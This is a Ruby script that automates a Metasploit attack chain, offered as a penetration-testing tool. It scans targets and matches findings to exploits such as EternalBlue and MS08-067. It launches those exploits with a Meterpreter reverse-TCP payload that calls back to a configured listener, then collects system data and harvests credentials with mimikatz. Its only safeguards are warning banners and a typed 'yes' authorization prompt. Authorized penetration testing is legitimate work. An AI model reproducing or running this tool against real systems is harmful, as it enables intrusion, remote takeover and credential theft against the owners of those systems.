#!/usr/bin/env ruby

# Metasploit Automation Script for Authorized Penetration Testing
# Author: Automated Security Testing Framework
# Usage: Only for authorized testing on systems you own or have permission to test

require 'msf/core'
require 'msf/core/framework'
require 'rex'
require 'fileutils'
require 'json'
require 'time'

class MetasploitAutomation
  attr_accessor :framework, :results, :config

  def initialize(config_path = 'pentest_config.json')
    @framework = Msf::Simple::Framework.create
    @results = []
    @config = load_config(config_path)
    setup_logging
  end

  def load_config(config_path)
    default_config = {
      "targets" => [],
      "scan_options" => {
        "nmap_options" => "-sS -sV -O --script=default,vuln",
        "port_range" => "1-65535",
        "timeout" => 300
      },
      "exploit_options" => {
        "payload" => "windows/meterpreter/reverse_tcp",
        "lhost" => "192.168.1.100",
        "lport" => 4444,
        "attempts" => 3
      },
      "reporting" => {
        "output_format" => "html",
        "generate_pdf" => true
      }
    }

    if File.exist?(config_path)
      JSON.parse(File.read(config_path))
    else
      File.write(config_path, JSON.pretty_generate(default_config))
      puts "[+] Created default config file: #{config_path}"
      default_config
    end
  end

  def setup_logging
    @log_dir = "logs/#{Time.now.strftime('%Y%m%d_%H%M%S')}"
    FileUtils.mkdir_p(@log_dir)
    @log_file = File.open("#{@log_dir}/metasploit_automation.log", 'w')
    log_message("[+] Metasploit Automation Started", "INFO")
  end

  def log_message(message, level = "INFO")
    timestamp = Time.now.strftime('%Y-%m-%d %H:%M:%S')
    log_entry = "[#{timestamp}] [#{level}] #{message}"
    puts log_entry
    @log_file.puts(log_entry)
    @log_file.flush
  end

  def scan_network(target)
    log_message("Starting network scan for: #{target}", "INFO")
    
    # Nmap scan through Metasploit
    nmap = @framework.auxiliary.create('scanner/portscan/tcp')
    nmap.datastore['RHOSTS'] = target
    nmap.datastore['PORTS'] = @config['scan_options']['port_range']
    nmap.datastore['THREADS'] = 50
    
    scan_results = []
    
    begin
      nmap.run_simple(
        'RunAsJob' => false,
        'Quiet' => false
      ) do |type, data|
        if type == :result
          scan_results << data
        end
      end
    rescue => e
      log_message("Scan error for #{target}: #{e.message}", "ERROR")
      return []
    end

    log_message("Scan completed for #{target}. Found #{scan_results.length} results", "INFO")
    scan_results
  end

  def vulnerability_scan(target, ports)
    log_message("Starting vulnerability scan for: #{target}", "INFO")
    vulnerabilities = []

    # Common vulnerability scanners
    vuln_scanners = [
      'scanner/smb/smb_version',
      'scanner/ssh/ssh_version',
      'scanner/http/http_version',
      'scanner/ftp/ftp_version',
      'scanner/mysql/mysql_version'
    ]

    vuln_scanners.each do |scanner_name|
      begin
        scanner = @framework.auxiliary.create(scanner_name)
        next unless scanner

        scanner.datastore['RHOSTS'] = target
        scanner.datastore['THREADS'] = 10

        scanner.run_simple(
          'RunAsJob' => false,
          'Quiet' => true
        ) do |type, data|
          if type == :result && data
            vulnerabilities << {
              scanner: scanner_name,
              target: target,
              result: data,
              timestamp: Time.now
            }
          end
        end
      rescue => e
        log_message("Vulnerability scan error with #{scanner_name}: #{e.message}", "ERROR")
      end
    end

    log_message("Vulnerability scan completed for #{target}. Found #{vulnerabilities.length} potential issues", "INFO")
    vulnerabilities
  end

  def exploit_vulnerabilities(target, vulnerabilities)
    log_message("Starting exploitation phase for: #{target}", "INFO")
    successful_exploits = []

    # Common exploits mapping
    exploit_map = {
      'scanner/smb/smb_version' => ['windows/smb/ms17_010_eternalblue', 'windows/smb/ms08_067_netapi'],
      'scanner/ssh/ssh_version' => ['linux/ssh/sshexec'],
      'scanner/http/http_version' => ['windows/iis/iis_webdav_scstoragepathfromurl'],
      'scanner/ftp/ftp_version' => ['windows/ftp/ms09_053_ftpd_nlst']
    }

    vulnerabilities.each do |vuln|
      next unless exploit_map[vuln[:scanner]]

      exploit_map[vuln[:scanner]].each do |exploit_name|
        success = attempt_exploit(target, exploit_name)
        if success
          successful_exploits << {
            target: target,
            exploit: exploit_name,
            timestamp: Time.now,
            session_id: success
          }
          break # Move to next vulnerability after successful exploit
        end
      end
    end

    log_message("Exploitation completed for #{target}. #{successful_exploits.length} successful exploits", "INFO")
    successful_exploits
  end

  def attempt_exploit(target, exploit_name)
    log_message("Attempting exploit: #{exploit_name} against #{target}", "INFO")
    
    begin
      exploit = @framework.exploits.create(exploit_name)
      return false unless exploit

      # Configure exploit
      exploit.datastore['RHOST'] = target
      exploit.datastore['PAYLOAD'] = @config['exploit_options']['payload']
      exploit.datastore['LHOST'] = @config['exploit_options']['lhost']
      exploit.datastore['LPORT'] = @config['exploit_options']['lport']

      # Attempt exploitation
      session = exploit.exploit_simple(
        'Payload' => @config['exploit_options']['payload'],
        'RunAsJob' => false,
        'LocalInput' => $stdin,
        'LocalOutput' => $stdout
      )

      if session && session.alive?
        log_message("Successful exploitation of #{target} with #{exploit_name}", "SUCCESS")
        return session.sid
      else
        log_message("Failed exploitation of #{target} with #{exploit_name}", "WARNING")
        return false
      end
    rescue => e
      log_message("Exploit error: #{e.message}", "ERROR")
      return false
    end
  end

  def post_exploitation(session_id)
    log_message("Starting post-exploitation for session: #{session_id}", "INFO")
    
    begin
      session = @framework.sessions.get(session_id)
      return unless session

      post_results = {}

      # System information gathering
      if session.type == 'meterpreter'
        post_results[:sysinfo] = session.sys.config.sysinfo
        post_results[:processes] = session.sys.process.processes
        post_results[:privileges] = session.sys.config.getprivs
        
        # Credential harvesting (if authorized)
        if @config['post_exploitation'] && @config['post_exploitation']['harvest_credentials']
          post_results[:credentials] = harvest_credentials(session)
        end
      end

      log_message("Post-exploitation completed for session: #{session_id}", "INFO")
      post_results
    rescue => e
      log_message("Post-exploitation error: #{e.message}", "ERROR")
      {}
    end
  end

  def harvest_credentials(session)
    credentials = []
    
    begin
      # Load mimikatz if available
      if session.ext.name == 'stdapi'
        session.core.use('mimikatz')
        if session.ext.aliases.include?('mimikatz')
          creds = session.mimikatz.msv
          credentials.concat(creds) if creds
        end
      end
    rescue => e
      log_message("Credential harvesting error: #{e.message}", "ERROR")
    end

    credentials
  end

  def generate_report
    log_message("Generating penetration test report", "INFO")
    
    report_data = {
      timestamp: Time.now,
      summary: {
        targets_scanned: @results.length,
        vulnerabilities_found: @results.sum { |r| r[:vulnerabilities].length },
        successful_exploits: @results.sum { |r| r[:exploits].length }
      },
      results: @results
    }

    # Generate JSON report
    json_report = "#{@log_dir}/pentest_report.json"
    File.write(json_report, JSON.pretty_generate(report_data))

    # Generate HTML report
    if @config['reporting']['output_format'] == 'html'
      generate_html_report(report_data)
    end

    log_message("Report generated: #{json_report}", "INFO")
    json_report
  end

  def generate_html_report(data)
    html_content = <<~HTML
      <!DOCTYPE html>
      <html>
      <head>
          <title>Penetration Test Report</title>
          <style>
              body { font-family: Arial, sans-serif; margin: 20px; }
              .header { background: #2c3e50; color: white; padding: 20px; }
              .summary { background: #ecf0f1; padding: 15px; margin: 20px 0; }
              .target { border: 1px solid #bdc3c7; margin: 10px 0; padding: 15px; }
              .vulnerability { background: #e74c3c; color: white; padding: 5px; margin: 5px 0; }
              .exploit { background: #27ae60; color: white; padding: 5px; margin: 5px 0; }
          </style>
      </head>
      <body>
          <div class="header">
              <h1>Penetration Test Report</h1>
              <p>Generated: #{data[:timestamp]}</p>
          </div>
          
          <div class="summary">
              <h2>Executive Summary</h2>
              <p>Targets Scanned: #{data[:summary][:targets_scanned]}</p>
              <p>Vulnerabilities Found: #{data[:summary][:vulnerabilities_found]}</p>
              <p>Successful Exploits: #{data[:summary][:successful_exploits]}</p>
          </div>

          <div class="results">
              <h2>Detailed Results</h2>
              #{generate_results_html(data[:results])}
          </div>
      </body>
      </html>
    HTML

    File.write("#{@log_dir}/pentest_report.html", html_content)
  end

  def generate_results_html(results)
    results.map do |result|
      <<~HTML
        <div class="target">
            <h3>Target: #{result[:target]}</h3>
            <h4>Vulnerabilities (#{result[:vulnerabilities].length})</h4>
            #{result[:vulnerabilities].map { |v| "<div class='vulnerability'>#{v[:scanner]}</div>" }.join}
            
            <h4>Successful Exploits (#{result[:exploits].length})</h4>
            #{result[:exploits].map { |e| "<div class='exploit'>#{e[:exploit]}</div>" }.join}
        </div>
      HTML
    end.join
  end

  def run_pentest
    log_message("Starting automated penetration test", "INFO")
    
    @config['targets'].each do |target|
      log_message("Processing target: #{target}", "INFO")
      
      # Phase 1: Network Scanning
      scan_results = scan_network(target)
      
      # Phase 2: Vulnerability Assessment
      vulnerabilities = vulnerability_scan(target, scan_results)
      
      # Phase 3: Exploitation
      exploits = exploit_vulnerabilities(target, vulnerabilities)
      
      # Phase 4: Post-exploitation
      post_results = []
      exploits.each do |exploit|
        post_data = post_exploitation(exploit[:session_id])
        post_results << post_data if post_data.any?
      end
      
      # Store results
      @results << {
        target: target,
        scan_results: scan_results,
        vulnerabilities: vulnerabilities,
        exploits: exploits,
        post_exploitation: post_results
      }
    end

    # Generate comprehensive report
    report_path = generate_report
    
    log_message("Penetration test completed successfully", "INFO")
    log_message("Report available at: #{report_path}", "INFO")
    
    cleanup_sessions
  end

  def cleanup_sessions
    log_message("Cleaning up active sessions", "INFO")
    @framework.sessions.each do |sid, session|
      begin
        session.kill if session.alive?
        log_message("Closed session: #{sid}", "INFO")
      rescue => e
        log_message("Error closing session #{sid}: #{e.message}", "ERROR")
      end
    end
  end

  def close
    @log_file.close if @log_file
    @framework.cleanup if @framework
  end
end

# Main execution
if __FILE__ == $0
  puts <<~BANNER
    ╔═══════════════════════════════════════════════════════════════╗
    ║                 METASPLOIT AUTOMATION FRAMEWORK              ║
    ║                                                               ║
    ║  WARNING: Only use on systems you own or have permission     ║
    ║           to test. Unauthorized access is illegal.           ║
    ║                                                               ║
    ║  Features:                                                    ║
    ║  • Automated network scanning                                 ║
    ║  • Vulnerability assessment                                   ║
    ║  • Exploitation attempts                                      ║
    ║  • Post-exploitation activities                               ║
    ║  • Comprehensive reporting                                    ║
    ╚═══════════════════════════════════════════════════════════════╝
  BANNER

  # Get user confirmation
  print "\nDo you have authorization to test the specified targets? (yes/no): "
  authorization = gets.chomp.downcase

  unless authorization == 'yes'
    puts "Exiting. Only use this tool on authorized targets."
    exit
  end

  begin
    pentest = MetasploitAutomation.new
    pentest.run_pentest
  rescue Interrupt
    puts "\n\n[!] Test interrupted by user"
  rescue => e
    puts "\n[!] Error: #{e.message}"
  ensure
    pentest.close if defined?(pentest)
  end
end
